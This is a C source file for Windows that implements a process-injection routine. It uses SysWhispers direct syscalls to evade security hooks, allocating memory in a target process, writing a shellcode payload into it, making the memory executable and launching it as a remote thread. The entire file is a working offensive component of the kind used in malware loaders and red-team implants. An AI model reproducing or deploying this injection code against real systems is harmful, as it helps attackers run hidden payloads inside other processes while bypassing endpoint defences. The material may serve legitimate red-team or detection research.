#include <Windows.h>

#include "include/SysWhispers.h"
#include "include/debug.h"

BOOL InjectShellcode(IN HANDLE hProcess, IN PVOID buf, IN SIZE_T bufSize) {

	NTSTATUS STATUS = 0x00;
	PVOID pAddress = NULL;
	ULONG uOldProtection = NULL;
	SIZE_T	sSize = bufSize;
	SIZE_T sNumberOfBytesWritten = NULL;
	HANDLE hThread = NULL;

	// Allocate memory
	if ((STATUS = Sw3NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}


	// Write the payload
	if ((STATUS = Sw3NtWriteVirtualMemory(hProcess, pAddress, buf, bufSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != bufSize) {
		PRINTA("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
		


	// Change memory protection to READWRITEEXECUTE
	if ((STATUS = Sw3NtProtectVirtualMemory(hProcess, &pAddress, &bufSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
		PRINTA("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}


	// Execute using thread creation
	if ((STATUS = Sw3NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}